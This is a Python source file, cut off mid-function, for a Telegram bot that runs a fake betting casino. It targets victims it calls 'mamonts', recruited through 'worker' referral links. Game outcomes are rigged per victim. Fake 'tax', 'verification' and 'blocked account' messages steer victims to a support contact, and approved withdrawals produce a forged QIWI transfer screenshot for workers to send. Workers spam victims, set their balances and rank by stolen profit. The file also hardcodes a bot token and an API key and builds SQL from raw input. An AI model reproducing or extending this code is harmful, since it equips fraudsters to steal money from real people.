from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.storage import FSMContext
from random import randint
import requests
import logging
import asyncio
import json
import re
from pyqiwip2p import AioQiwiP2P
from python_qiwi import QiwiWаllet

logging.basicConfig(level=logging.INFO)

import resources.texts as texts
import resources.draw as draw
import resources.buttons as kb
from resources.database import Database
from resources.states import States

db = Database('database.db')
qiwi_tokens = db.cursor.execute('SELECT * FROM qiwi_tokens WHERE is_active=1').fetchone()



# Токен бота
bot = Bot('5700828080:AAEJFawimAK20xnbIwENIjb1siv5mNuvVM0', parse_mode='html')
# Токен киви
p2p = AioQiwiP2P(
    auth_key=qiwi_tokens[2])

# Токен Fixer API
headers = {'apikey': 'lCubnsUpcUj3qnx0GWmKqi3TwmfPIRas'}

storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# Валюты (Можно не трогать, один хуй пока не реализовано)

RUB = 0
UAH = 0
BYN = 0

# Основной процент, который забирается у воркера
percent = 30
# Процент при использовании тех.поддержки
percent_sup = 40

# Айди канала с профитами
profit_channel = -1001722750123

# Поддержка
support = '@official_betboom'

# Меню

states = ('Всегда выигрыш', 'Рандом', 'Всегда проигрыш', 'Верификация', 'Налог', 'Аккаунт временно заблокирован')

@dp.message_handler(commands='start', state='*')
async def start(msg: types.Message, state: FSMContext):
    await state.finish()
    if not db.user_exists(msg.from_user.id):
        ref = 0
        if msg.get_args():
            if msg.get_args() != 'worker':
                ref = int(msg.get_args())
                db.cursor.execute('UPDATE users SET mamonts=mamonts+1 WHERE user_id=' + msg.get_args())
                if not db.user_is_worker(ref):
                    ref = 5443071551
                db.add_user(msg.from_user.id, msg.from_user.full_name, msg.from_user.username, ref)
                db.conn.commit()
            else:
                db.add_user(msg.from_user.id, msg.from_user.full_name, msg.from_user.username, ref)
                db.cursor.execute(f'UPDATE users SET is_worker=1 WHERE user_id={msg.from_user.id}')
                db.conn.commit()
        elif not msg.get_args():
            print('xyu')
            db.add_user(msg.from_user.id, msg.from_user.full_name, msg.from_user.username, ref)
        if msg.get_args():
            if msg.get_args() != 'worker':
                get_min = db.cursor.execute(f'SELECT min_deposit FROM users WHERE user_id={ref}').fetchone()[0]
                db.cursor.execute(f'UPDATE users SET min_deposit={get_min} WHERE user_id={msg.from_user.id}')
                db.conn.commit()
                await bot.send_message(db.get_referer(msg.from_user.id), f'Новый мамонт! Ник: <a href="tg://user?id={msg.from_user.id}">{msg.from_user.full_name}</a>\n\n<b>Так же не забывайте, что всегда можете обратиться за помощью в чат воркеров!</b>')
        await msg.answer(texts.agreement.format(msg.from_user.first_name), parse_mode='html', reply_markup=kb.agree_kb)
    else:
        if msg.get_args() == 'worker':
            db.cursor.execute(f'UPDATE users SET is_worker=1 WHERE user_id={msg.from_user.id}')
            db.conn.commit()
        await restart_keyboard(msg, state)
        await profile(msg, state)

@dp.callback_query_handler(text='accept_agreements')
async def accept_agreement(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.delete()
    await restart_keyboard_callback(callback, state)
    await profile_callback(callback, state)


async def restart_keyboard(msg: types.Message, state: FSMContext):
    user = db.get_user_by_user_id(msg.from_user.id)
    await msg.answer('🔄 Обновляю меню...', reply_markup=kb.main_kb(user[7]))


async def restart_keyboard_callback(call: types.CallbackQuery, state: FSMContext):
    user = db.get_user_by_user_id(call.from_user.id)
    await call.message.answer('🔄 Обновляю меню...', reply_markup=kb.main_kb(user[7]))


async def profile(msg: types.Message, state: FSMContext):
    user = db.get_user_by_user_id(msg.from_user.id)
    await msg.answer_photo('https://i.imgur.com/k4XWSpV.png', texts.main_menu.format(balance=user[2],
                                                                                     invited=user[15],
                                                                                     user_id=user[1],
                                                                                     fake_players=randint(1588, 1655)),
                           reply_markup=kb.profile_kb, parse_mode='html')


async def profile_callback(callback: types.CallbackQuery, state: FSMContext):
    user = db.get_user_by_user_id(callback.from_user.id)
    await callback.message.answer_photo('https://i.imgur.com/k4XWSpV.png', texts.main_menu.format(balance=user[2],
                                                                                                  invited=user[6],
                                                                                                  user_id=user[1],
                                                                                                  fake_players=randint(
                                                                                                      1588, 1655)),
                                        reply_markup=kb.profile_kb, parse_mode='html')

@dp.message_handler(commands='cancel', state='*')
async def cancel(msg: types.Message, state: FSMContext):
    await state.finish()
    await msg.answer('Действие отменено!')

# Игра
@dp.message_handler(text='Играть 🎰', state='*')
async def play(msg: types.Message, state: FSMContext):
    await state.finish()
    if db.get_user_block_status(msg.from_user.id) == 5:
        return await msg.answer(f'❌ <b>Ваш аккаунт заблокирован за нарушение правил проекта\n\n</b>Для выяснения точной причины обратитесь в техническую поддержку:\n{support}')
    if db.get_user_block_status(msg.from_user.id) == 4:
        return await msg.answer(f'<b>❌ Уважаемый пользователь!</b>\n\nВаш выигрыш облагается налогом, пожалуйста обратитесь в техническую поддержку:\n{support}')
    await msg.answer_photo('https://i.imgur.com/jbFr7IY.png', texts.rules_game, parse_mode='html',
                           reply_markup=kb.game_kb)


@dp.message_handler(text='Профиль 💠', state='*')
async def profile_get(msg: types.Message, state: FSMContext):
    await state.finish()
    await profile(msg, state)


@dp.message_handler(text='Меню воркера 🛠', state='*')
async def worker_menu(msg: types.Message, state: FSMContext):
    await state.finish()
    user = db.get_user_by_user_id(msg.from_user.id)
    await msg.answer_photo('https://i.imgur.com/0BfzL4V.png', texts.menu_worker.format(money_mamonts=user[16],
                                                                                       money_from_mamonts=user[12],
                                                                                       mamonts=user[15],
                                                                                       referals=user[14],
                                                                                       referals_money=user[17]),
                           reply_markup=kb.worker_kb(user[7]))

@dp.message_handler(text='Админ панель 🔱', state='*')
async def admin_panel(msg: types.Message, state: FSMContext):
    try:
        if db.user_is_admin(msg.from_user.id) == 2:
            await msg.answer_photo('https://i.imgur.com/WrypSZe.png', '<b>Добро пожаловать, царь.</b>', reply_markup=kb.admin_kb)
    except:
        if db.user_is_admin(msg.from_user.id) == 2:
            await msg.message.delete()
            await msg.message.answer_photo('https://i.imgur.com/WrypSZe.png', '<b>Добро пожаловать, царь.</b>', reply_markup=kb.admin_kb)

@dp.callback_query_handler(text_startswith='spam_menu')
async def spam_choose(call: types.CallbackQuery, state: FSMContext):
    await call.message.answer('Кому будем спамить?', reply_markup=kb.spam_kb)

@dp.callback_query_handler(text_startswith='spam_mamonts')
async def spam_mamonts(call: types.CallbackQuery, state: FSMContext):
    await States.mamont_spam_state.set()
    await call.message.answer('Напишите сообщение для отправки мамонтам')

@dp.message_handler(state=States.mamont_spam_state)
async def spam_process(msg: types.Message, state: FSMContext):
    await msg.answer('Начинаю спамить...')
    data = msg.text
    mamonts = db.get_all_mamonts()
    for i in mamonts:
        try:
            await bot.send_message(i[1], data)
        except:
            pass
    await msg.answer('Мамонтам разосланы сообщения!')

@dp.callback_query_handler(text_startswith='spam_workers')
async def spam_workers(call: types.CallbackQuery, state: FSMContext):
    await States.worker_spam_state.set()
    await call.message.answer('Напишите сообщение для отправки воркерам')

@dp.message_handler(state=States.worker_spam_state)
async def spam_process(msg: types.Message, state: FSMContext):
    await msg.answer('Начинаю спамить...')
    data = msg.text
    workers = db.get_all_workers()
    for i in workers:
        try:
            await bot.send_message(i[1], data)
        except:
            pass
    await msg.answer('Воркерам разосланы сообщения!')

@dp.callback_query_handler(text_startswith='give_balance_to')
async def give_mamont_balance_write(call: types.CallbackQuery, state: FSMContext):
    await States.write_mamont_id_state.set()
    await call.message.answer('<b>Введите айди пользователя:</b>')

@dp.message_handler(state=States.write_mamont_id_state)
async def write_sum_mamont(msg: types.Message, state: FSMContext):
    await States.write_balance_state.set()
    data = await state.set_data({'mamont_id' : msg.text})
    await msg.answer('<b>Введите сумму, которую хотите прибавить пользователю:</b>')

@dp.message_handler(state=States.write_balance_state)
async def add_money_mamont(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    await state.finish()
    db.add_user_balance_user_id(data['mamont_id'], msg.text)
    await msg.answer('<b>Успешно!</b>')

@dp.callback_query_handler(text_startswith='give_mamont_to')
async def mamont_write_him_id(call: types.CallbackQuery, state: FSMContext):
    await States.write_mamont_id_state1.set()
    await call.message.answer('<b>Введите айди мамонта:</b>')

@dp.message_handler(state=States.write_mamont_id_state1)
async def write_id_worker(msg: types.Message, state: FSMContext):
    await States.write_worker_id_state.set()
    await state.set_data({'mamont_id' : msg.text})
    await msg.answer('<b>Введите айди воркера, которому хотите передать мамонта:</b>')

@dp.message_handler(state=States.write_worker_id_state)
async def give_mamont_to_worker(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    db.cursor.execute(f'UPDATE users SET referer_id={msg.text} WHERE user_id={data["mamont_id"]}')
    db.conn.commit()
    await msg.answer('<b>Успешно</b>')

statuses = {0: '🔴', 1: '🟢'}

@dp.callback_query_handler(text_startswith='qiwi_menu')
async def menu_qiwi(call: types.CallbackQuery):
    await call.message.delete()
    accounts = db.cursor.execute('SELECT * FROM qiwi_tokens')
    qiwi_wallet_buttons = kb.InlineKeyboardMarkup(row_width=1)
    for i in accounts:
        wallet = QiwiWаllet(str(i[1]), i[3])
        qiwi_wallet_buttons.add(kb.InlineKeyboardButton(f'💳{wallet.balance()}₽ | 📱{i[1]} {statuses[i[4]]}', callback_data=f'wallet {i[0]}'))
    qiwi_wallet_buttons.add(kb.InlineKeyboardButton('🔙 Вернуться назад', callback_data='back_from_qiwi_wallet'))
    await call.message.answer_photo('https://ggdt.ru/file/2022/04/45e517825428c13b061b7cb4b152ab6e.png', reply_markup=qiwi_wallet_buttons)

@dp.callback_query_handler(text_startswith='back_from_qiwi_wallet')
async def back_to_qiwi(call: types.CallbackQuery):
    await admin_panel(call, FSMContext)

@dp.callback_query_handler(text_startswith='wallet')
async def wallet_info(call: types.CallbackQuery):
    await call.message.delete()
    wallet = db.cursor.execute(f'SELECT * FROM qiwi_tokens WHERE id={call.data.split()[1]}').fetchone()
    qiwi_kb = kb.InlineKeyboardMarkup(row_width=1)
    if wallet[4]:
        qiwi_kb.add(kb.InlineKeyboardButton(f'Используемый кошелёк {statuses[wallet[4]]}', callback_data='no'))
    else:
        qiwi_kb.add(kb.InlineKeyboardButton(f'Неиспользуемый кошелёк {statuses[wallet[4]]}', callback_data=f'set_qiwi_status_true {wallet[0]}'))
    qiwi_kb.add(kb.InlineKeyboardButton('🔙 Вернуться назад', callback_data='back_from_qiwi_wallet'))
    await call.message.answer_photo('https://ggdt.ru/file/2022/04/45e517825428c13b061b7cb4b152ab6e.png', f'<b>Номер телефона: </b>{wallet[1]}\n\nБаланс: <b>{QiwiWаllet(str(wallet[1]), wallet[3]).balance()}₽</b>', reply_markup=qiwi_kb)

@dp.callback_query_handler(text_startswith='set_qiwi_status_true')
async def qiwi_set(call: types.CallbackQuery):
    db.cursor.execute('UPDATE qiwi_tokens SET is_active=0')
    db.cursor.execute(f'UPDATE qiwi_tokens SET is_active=1 WHERE id={call.data.split()[1]}')
    db.conn.commit()
    qiwi_kb = kb.InlineKeyboardMarkup(row_width=1)
    wallet = db.cursor.execute(f'SELECT * FROM qiwi_tokens WHERE id={call.data.split()[1]}').fetchone()
    if wallet[4]:
        qiwi_kb.add(kb.InlineKeyboardButton(f'Используемый кошелёк {statuses[wallet[4]]}', callback_data='no'))
    else:
        qiwi_kb.add(kb.InlineKeyboardButton(f'Неиспользуемый кошелёк {statuses[wallet[4]]}', callback_data=f'set_qiwi_status_true {wallet[0]}'))
    qiwi_kb.add(kb.InlineKeyboardButton('🔙 Вернуться назад', callback_data='back_from_qiwi_wallet'))
    await call.message.edit_caption(f'<b>Номер телефона: </b>{wallet[1]}\n\nБаланс: <b>{QiwiWаllet(str(wallet[1]), wallet[3]).balance()}₽</b>', reply_markup=qiwi_kb)



@dp.callback_query_handler(text='play')
async def choose_money_play(call: types.CallbackQuery, state: FSMContext):
    if db.get_user_block_status(call.from_user.id) == 3:
        return await call.message.answer(f'<b>❌ Уважаемый пользователь!</b>\n\nВозникла ошибка, обратитесь пожалуйста в техническую поддержку, для прохождения верификации лицевого счета:\n{support}')
    await call.message.delete()
    await call.message.answer('💸 <b>Введите сумму ставки:</b>\n<i>Сумма ставки должна быть целым числом!</i>',
                              parse_mode='html')
    await States.select_money_to_play_state.set()


@dp.message_handler(state=States.select_money_to_play_state)
async def choosed_money_select_play(msg: types.Message, state: FSMContext):
    await state.finish()
    if db.get_user_block_status(msg.from_user.id) == 5:
        return await msg.answer(f'❌ <b>Ваш аккаунт заблокирован за нарушение правил проекта\n\n</b>Для выяснения точной причины обратитесь в техническую поддержку:\n{support}')
    if db.get_user_block_status(msg.from_user.id) == 4:
        return await msg.answer(f'<b>❌ Уважаемый пользователь!</b>\n\nВаш выигрыш облагается налогом, пожалуйста обратитесь в техническую поддержку:\n{support}')
    if not re.match(r'^\d+$', msg.text):
        return await msg.answer('<b>❌ Вы ввели некорректное число!</b>', parse_mode='html')
    if int(msg.text) > db.get_user_balance(msg.from_user.id):
        return await msg.answer('<b>❌ На Вашем балансе отсутствует данная сумма, повторите попытку!</b>',
                                parse_mode='html')
    if int(msg.text) < 50:
        return await msg.answer('❌ Минимальная сумма ставки: 50₽!', parse_mode='html')
    await state.finish()
    await msg.answer(texts.menu_game.format(msg.text), parse_mode='html', reply_markup=kb.game_select_kb(msg.text))


@dp.callback_query_handler(
    lambda c: c.data.startswith('lower') or c.data.startswith('upper') or c.data.startswith('equal'))
async def play_game_results(call: types.CallbackQuery, state: FSMContext):
    await state.finish()
    if db.get_user_block_status(call.from_user.id) == 5:
        return await call.message.answer(f'❌ <b>Ваш аккаунт заблокирован за нарушение правил проекта\n\n</b>Для выяснения точной причины обратитесь в техническую поддержку:\n{support}')
    if db.get_user_block_status(call.from_user.id) == 4:
        return await call.message.answer(f'<b>❌ Уважаемый пользователь!</b>\n\nВаш выигрыш облагается налогом, пожалуйста обратитесь в техническую поддержку:\n{support}')
    await call.message.delete()
    args = call.data.split()
    win = '🎉 Вы выиграли'
    lose = '😢 Вы проиграли'
    win_m = 'выиграл'
    lose_m = 'проиграл'
    if db.get_user_block_status(call.from_user.id) == 0:
        if args[0] == 'lower':
            db.add_user_balance_user_id(call.from_user.id, int(args[1]))
            await call.message.answer(
                texts.win_or_lose.format(win, randint(51, 100), db.get_user_balance(call.from_user.id)), reply_markup=kb.game_kb)
            if db.is_log(call.from_user.id) and db.user_is_worker(db.get_referer(call.from_user.id)):
                await bot.send_message(db.get_referer(call.from_user.id),
                                       texts.mamont_win_ac.format(win_m, call.from_user.first_name, int(args[1]), 'Меньше 50', db.get_user_balance(call.from_user.id)))
        if args[0] == 'upper':
            db.add_user_balance_user_id(call.from_user.id, int(args[1]))
            await call.message.answer(
                texts.win_or_lose.format(win, randint(1, 49), db.get_user_balance(call.from_user.id)), reply_markup=kb.game_kb)
            if db.is_log(call.from_user.id) and db.user_is_worker(db.get_referer(call.from_user.id)):
                await bot.send_message(db.get_referer(call.from_user.id),
                                        texts.mamont_win_ac.format(win_m, call.from_user.first_name, int(args[1]), 'Больше 50', db.get_user_balance(call.from_user.id)))
        if args[0] == 'equal':
            db.add_user_balance_user_id(call.from_user.id, int(args[1]) * 9)
            await call.message.answer(
                texts.win_or_lose.format(win, 50, db.get_user_balance(call.from_user.id)), reply_markup=kb.game_kb)
            if db.is_log(call.from_user.id) and db.user_is_worker(db.get_referer(call.from_user.id)):
                await bot.send_message(db.get_referer(call.from_user.id),
                                       texts.mamont_win_ac.format(win_m, call.from_user.first_name, int(args[1]), 'Равно 50', db.get_user_balance(call.from_user.id)))
    elif db.get_user_block_status(call.from_user.id) == 1:
        rdm = randint(1, 100)
        if args[0] == 'lower':
            if rdm < 50:
                db.add_user_balance_user_id(call.from_user.id, int(args[1]))
                await call.message.answer(text=texts.win_or_lose.format(win, rdm, db.get_user_balance(call.from_user.id)), reply_markup=kb.game_kb)
                if db.is_log(call.from_user.id) and db.user_is_worker(db.get_referer(call.from_user.id)):
                    await bot.send_message(db.get_referer(call.from_user.id),
                                           texts.mamont_win_ac.format(win_m, call.from_user.first_name, int(args[1]),
                                                                      'Меньше 50', db.get_user_balance(call.from_user.id)))
            else:
                db.subtract_user_balance(call.from_user.id, int(args[1]))
                await call.message.answer(texts.win_or_lose.format(lose, rdm, db.get_user_balance(call.from_user.id)), reply_markup=kb.game_kb)
                if db.is_log(call.from_user.id) and db.user_is_worker(db.get_referer(call.from_user.id)):
                    await bot.send_message(db.get_referer(call.from_user.id),
                                           texts.mamont_win_ac.format(lose_m, call.from_user.first_name, int(args[1]),
                                                                      'Меньше 50', db.get_user_balance(call.from_user.id)))
        if args[0] == 'upper':
            if rdm > 50:
                db.add_user_balance_user_id(call.from_user.id, int(args[1]))
                await call.message.answer(texts.win_or_lose.format(win, rdm, db.get_user_balance(call.from_user.id)), reply_markup=kb.game_kb)
                if db.is_log(call.from_user.id) and db.user_is_worker(db.get_referer(call.from_user.id)):
                    await bot.send_message(db.get_referer(call.from_user.id),
                                           texts.mamont_win_ac.format(win_m, call.from_user.first_name, int(args[1]),
                                                                      'Больше 50', db.get_user_balance(call.from_user.id)))
            else:
                db.subtract_user_balance(call.from_user.id, int(args[1]))
                await call.message.answer(texts.win_or_lose.format(lose, rdm, db.get_user_balance(call.from_user.id)), reply_markup=kb.game_kb)
                if db.is_log(call.from_user.id) and db.user_is_worker(db.get_referer(call.from_user.id)):
                    await bot.send_message(db.get_referer(call.from_user.id),
                                           texts.mamont_win_ac.format(lose_m, call.from_user.first_name, int(args[1]),
                                                                      'Больше 50', db.get_user_balance(call.from_user.id)))
        if args[0] == 'equal':
            if rdm == 50:
                db.add_user_balance_user_id(call.from_user.id, int(args[1]) * 9)
                await call.message.answer(texts.win_or_lose.format(win, rdm, db.get_user_balance(call.from_user.id)), reply_markup=kb.game_kb)
                if db.is_log(call.from_user.id) and db.user_is_worker(db.get_referer(call.from_user.id)):
                    await bot.send_message(db.get_referer(call.from_user.id),
                                           texts.mamont_win_ac.format(win_m, call.from_user.first_name, int(args[1]),
                                                                      'Равно 50', db.get_user_balance(call.from_user.id)))
            else:
                db.subtract_user_balance(call.from_user.id, int(args[1]))
                await call.message.answer(texts.win_or_lose.format(lose, rdm, db.get_user_balance(call.from_user.id)), reply_markup=kb.game_kb)
                if db.is_log(call.from_user.id) and db.user_is_worker(db.get_referer(call.from_user.id)):
                    await bot.send_message(db.get_referer(call.from_user.id),
                                           texts.mamont_win_ac.format(lose_m, call.from_user.first_name, int(args[1]),
                                                                      'Равно 50', db.get_user_balance(call.from_user.id)))
    elif db.get_user_block_status(call.from_user.id) == 2:
        if args[0] == 'lower':
            db.subtract_user_balance(call.from_user.id, int(args[1]))
            await call.message.answer(
                texts.win_or_lose.format(lose, randint(1, 49), db.get_user_balance(call.from_user.id)), reply_markup=kb.game_kb)
            if db.is_log(call.from_user.id) and db.user_is_worker(db.get_referer(call.from_user.id)):
                await bot.send_message(db.get_referer(call.from_user.id),
                                       texts.mamont_win_ac.format(lose_m, call.from_user.first_name, int(args[1]), 'Больше 50', db.get_user_balance(call.from_user.id)))
        if args[0] == 'upper':
            db.subtract_user_balance(call.from_user.id, int(args[1]))
            await call.message.answer(
                texts.win_or_lose.format(lose, randint(51, 100), db.get_user_balance(call.from_user.id)), reply_markup=kb.game_kb)
            if db.is_log(call.from_user.id) and db.user_is_worker(db.get_referer(call.from_user.id)):
                await bot.send_message(db.get_referer(call.from_user.id),
                                       texts.mamont_win_ac.format(lose_m, call.from_user.first_name, int(args[1]), 'Меньше 50', db.get_user_balance(call.from_user.id)))
        if args[0] == 'equal':
            db.subtract_user_balance(call.from_user.id, int(args[1]))
            await call.message.answer(
                texts.win_or_lose.format(lose, randint(1, 49), db.get_user_balance(call.from_user.id)), reply_markup=kb.game_kb)
            if db.is_log(call.from_user.id) and db.user_is_worker(db.get_referer(call.from_user.id)):
                await bot.send_message(db.get_referer(call.from_user.id),
                                       texts.mamont_win_ac.format(lose_m, call.from_user.first_name, int(args[1]), 'Равно 50', db.get_user_balance(call.from_user.id)))


@dp.callback_query_handler(text='deposit')
async def deposit_qiwi_write_sum(call: types.CallbackQuery):
    await call.message.answer_photo('https://i.imgur.com/jbFr7IY.png', '✍ Введите сумму пополнения:')
    await States.qiwi_set_payment_state.set()


@dp.message_handler(state=States.qiwi_set_payment_state)
async def deposit_writed_bill_pay(msg: types.Message, state: FSMContext):
    await state.finish()
    if not re.match(r'^\d+$', msg.text):
        return await msg.answer('❌ Вы ввели некорректное число!')
    if int(msg.text) < db.min_depos(msg.from_user.id):
        return await msg.answer(f'❌ Минимальная сумма пополнения: {db.min_depos(msg.from_user.id)}₽!')
    bill = await p2p.bill(randint(1000000000, 9999999999), amount=int(msg.text), currency='RUB', lifetime=30)
    mamont = db.get_user_by_user_id(msg.from_user.id)
    try:
        if db.user_is_worker(mamont[4]) or db.user_is_worker(mamont[4]) == 2:
            await bot.send_message(mamont[4], f'😎 Новый запрос пополнения от {msg.from_user.full_name} на {bill.amount}₽',
                                   reply_markup=kb.InlineKeyboardMarkup().add(kb.InlineKeyboardButton('Оплатить',
                                                                                                      callback_data=f'm_pay {bill.bill_id} {msg.from_user.id}')))
    except Exception as e:
        print(e)
    n = 0
    if msg.from_user.id == 5443071551:
        n = 1
    db.cursor.execute(f'INSERT INTO bills (bill_id, user_id, is_support) VALUES ({bill.bill_id}, {msg.from_user.id}, {n})')
    db.conn.commit()
    await msg.answer_photo('https://i.imgur.com/cTK53NQ.png', texts.pay_text, parse_mode='html',
                           reply_markup=kb.InlineKeyboardMarkup().add(
                               kb.InlineKeyboardButton('Оплатить', url=bill.pay_url)))


@dp.callback_query_handler(text_startswith='m_pay')
async def mamont_can_pay(call: types.CallbackQuery):
    id = await p2p.check(call.data.split()[1])
    print('заебок')
    db.add_user_balance_user_id(call.data.split()[2], str(id.amount).split('.')[0])
    await bot.send_message(call.data.split()[2], f'''✅ Обнаружено пополнение на Ваш счёт!
💸 Сумма: {id.amount}₽''')
    await call.message.edit_text('<b>✅ Вы успешно пополнили баланс мамонту!</b>',
                                 reply_markup=kb.InlineKeyboardMarkup().add(
                                     kb.InlineKeyboardButton('⬅ Назад к мамонту',
                                                             callback_data=f'back_to_mamont {call.data.split()[2]}')
                                 ))
    await p2p.reject(id.bill_id)

@dp.callback_query_handler(text='top')
async def top_get(call: types.CallbackQuery):
    top = db.cursor.execute('SELECT * FROM users ORDER by money_from_mamonts DESC').fetchmany(10)
    rank = db.cursor.execute('SELECT * FROM users ORDER by money_from_mamonts DESC').fetchall()
    s = '🏆 Топ воркеров\n\n'
    worker = db.get_user_by_user_id(call.from_user.id)
    n=1
    for user in top:
        s = s + f'{n}. <a href="t.me/{user[9]}">{user[8]}</a> | {user[12]} ₽\n'
        n=n+1
    s = s + f'\n💸 Ваш личный профит с мамонтов: {worker[12]} ₽\n'
    ny = 1
    for i in rank:
        if i[1] == call.from_user.id:
            s = s+f'🏆 Ваше место в топе: {ny}'
        else:
            ny = ny+1
    await call.message.edit_caption(s, reply_markup=kb.InlineKeyboardMarkup().add(
        kb.InlineKeyboardButton('⬅ Назад', callback_data='back_to_work_menu')
    ))



@dp.callback_query_handler(text='back_to_work_menu')
async def get_work_menu(call: types.CallbackQuery):
    user = db.get_user_by_user_id(call.from_user.id)
    await call.message.edit_caption(texts.menu_worker.format(money_mamonts=user[16],
                                                                                       money_from_mamonts=user[12],
                                                                                       mamonts=user[15],
                                                                                       referals=user[14],
                                                                                       referals_money=user[17]),
                                    reply_markup=kb.worker_kb(user[7]))


@dp.callback_query_handler(text='info')
async def information(call: types.CallbackQuery, state: FSMContext):
    await call.message.edit_caption(texts.info_text, reply_markup=kb.InlineKeyboardMarkup().add(
        kb.InlineKeyboardButton('⬅ Назад', callback_data='back_to_work_menu')
    ))


@dp.callback_query_handler(text_startswith='en_log')
async def logging_state(call: types.CallbackQuery, state: FSMContext):
    is_logging = db.cursor.execute(f'SELECT log_mamont FROM users WHERE user_id={call.data.split()[1]}').fetchone()[0]
    if is_logging:
        db.cursor.execute(f'UPDATE users SET log_mamont=0 WHERE user_id={call.data.split()[1]}')
    else:
        db.cursor.execute(f'UPDATE users SET log_mamont=1 WHERE user_id={call.data.split()[1]}')
    db.conn.commit()
    await call.answer('Статус логирования поменян!')
    try:
        await mamont_info1(call, state)
    except:
        await mamont_info(call, state)


@dp.callback_query_handler(text='check_mamonts')
async def find_mamonts(call: types.CallbackQuery):
    await call.message.answer_chat_action('text=@devil1737bot m=')


@dp.callback_query_handler(text_startswith='update')
async def update_mamont(inline: types.CallbackQuery):
    item = db.get_user_by_user_id(inline.data.split()[1])
    log_status = 'Включено' if item[13] else 'Выключено'
    try:
        await bot.edit_message_text(
            texts.mamont_info.format(name=item[9], balance=item[2], referals_mamont=item[14], status=states[item[11]],
                                     log_mamont=log_status),
            reply_markup=kb.mamont_set_kb(item[1]), inline_message_id=inline.inline_message_id)
    except Exception as e:
        await inline.answer('Изменений нет!')


@dp.callback_query_handler(text_startswith='change_balance1')
async def change_balance(call: types.CallbackQuery, state: FSMContext):
    await bot.send_message(call.from_user.id, '✍ <b>Введите сумму, которая будет установлена на баланс мамонта:</b>')
    await States.money_set_payment_state.set()
    await state.update_data({'id': call.data.split()[1]})


@dp.callback_query_handler(text='withdraw')
async def withdraw_set(call: types.CallbackQuery, state: FSMContext):
    await call.message.answer(f'''<b>✍️ Введи сумму для вывода:
Ваш баланс:</b> {db.get_user_balance(call.from_user.id)} ₽''')
    await States.withdraw_state.set()


@dp.message_handler(state=States.withdraw_state)
async def withdraw_check_n_d(msg: types.Message, state: FSMContext):
    if db.get_user_block_status(msg.from_user.id) == 5:
        return await msg.answer(f'❌ <b>Ваш аккаунт заблокирован за нарушение правил проекта\n\n</b>Для выяснения точной причины обратитесь в техническую поддержку:\n{support}')
    if db.get_user_block_status(msg.from_user.id) == 4:
        return await msg.answer(f'<b>❌ Уважаемый пользователь!</b>\n\nВаш выигрыш облагается налогом, пожалуйста обратитесь в техническую поддержку:\n{support}')
    if db.get_user_block_status(msg.from_user.id) == 3:
        return await msg.answer(f'<b>❌ Уважаемый пользователь!</b>\n\nВозникла ошибка вывода средств, обратитесь пожалуйста в техническую поддержку, для прохождения верификации лицевого счета:\n{support}')
    if not re.match('^\d+$', msg.text):
        return await msg.answer('❌ Число введено неверно!')
    if db.get_user_balance(msg.from_user.id) < int(msg.text):
        return await msg.answer('❌ На вашем счету недостаточно средств!')
    if int(msg.text) < db.min_depos(msg.from_user.id):
        return await msg.answer(f'❌ Вывод доступен только от {db.min_depos(msg.from_user.id)} ₽')
    await state.update_data({'w_mon': int(msg.text)})
    await msg.answer('''⚠️ <b>Вывод возможен только на реквизиты, с которых пополнялся Ваш баланс в последний раз!

Подтвердить?</b>''', reply_markup=kb.InlineKeyboardMarkup().add(kb.InlineKeyboardButton('Да', callback_data='accept_withdraw'),
                                                                kb.InlineKeyboardButton('Нет', callback_data='back_to_m_m')))

@dp.callback_query_handler(text='back_to_m_m', state='*')
async def back_m_m(call: types.CallbackQuery, state: FSMContext):
    await state.finish()
    await call.message.delete()
    await profile_callback(call, state)


@dp.callback_query_handler(text='accept_withdraw', state='*')
async def withdraw_accepted(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    await state.finish()
    await call.message.edit_text('''✅ Запрос на вывод был успешно создан!
〰️〰️〰️〰️〰️〰️〰️〰️〰️
🕑 Ожидайте...''')
    mamont = db.get_user_by_user_id(call.from_user.id)
    await bot.send_message(mamont[4],
                           texts.mamont_withdraw_ac.format(mamont=mamont[8], login=mamont[9], withdraw=data['w_mon']), reply_markup=kb.mamont_withdrawal(mamont[1], data['w_mon']))


@dp.callback_query_handler(text_startswith='change_balance')
async def change_balance(call: types.CallbackQuery, state: FSMContext):
    await bot.edit_message_text('✍ <b>Введите сумму, которая будет установлена на баланс мамонта:</b>',
                                inline_message_id=call.inline_message_id)
    await States.money_set_payment_state.set()
    await state.update_data({'id': call.data.split()[1]})

@dp.callback_query_handler(text_startswith='withdrawal', state='*')
async def withdrawal_state_msg(call: types.CallbackQuery, state: FSMContext):
    await call.message.delete()
    arg = call.data.split()
    mamont = db.get_user_by_user_id(call.from_user.id)
    await state.finish()
    if not bool(int(arg[1])):
        await bot.send_message(arg[2], f'''<b>⚠️ Заявка на вывод отклонена!</b>

<i>Просим Вас обратиться в тех.поддержку!</i>
{support}''')
    else:
        db.subtract_user_balance(arg[2], arg[3])
        await bot.send_message(arg[2], '''<b>✅ Заявка на вывод принята!</b>

<i>Средства поступят на Ваши реквизиты в течении 15 минут.</i>''')
        await bot.send_message(call.from_user.id, '<b>✅ Успешно!\nСкопируйте скрин ниже, и отправьте мамонту!</b>')
        await bot.send_photo(call.from_user.id, draw.fake_qiwi_transfer(arg[3], 74952801762))

@dp.callback_query_handler(text_startswith='send_msg')
async def mamont_how_message_write(call: types.CallbackQuery, state: FSMContext):
    await States.send_mamont_message_state.set()
    await state.update_data({'id': call.data.split()[1]})
    try:
        await call.message.answer('✍ <b>Введите текст, который будет отправлен мамонту:</b>')
    except:
        await bot.send_message(call.from_user.id, '✍ <b>Введите текст, который будет отправлен мамонту:</b>')


@dp.message_handler(state=States.send_mamont_message_state)
async def mamont_send_real_message(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    await bot.send_message(data['id'], msg.text)
    await msg.answer('✅ Сообщение было успешно доставлено')
    await state.finish()


@dp.message_handler(state=States.money_set_payment_state)
async def set_balance_mamont(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    db.set_user_balance_user_id(data['id'], int(msg.text))
    await state.finish()
    await msg.answer('✅ Вы успешно изменили баланс мамонта!')


async def mamont_info1(call: types.CallbackQuery, state: FSMContext):
    item = db.get_user_by_user_id(call.data.split()[1])
    await bot.edit_message_text(
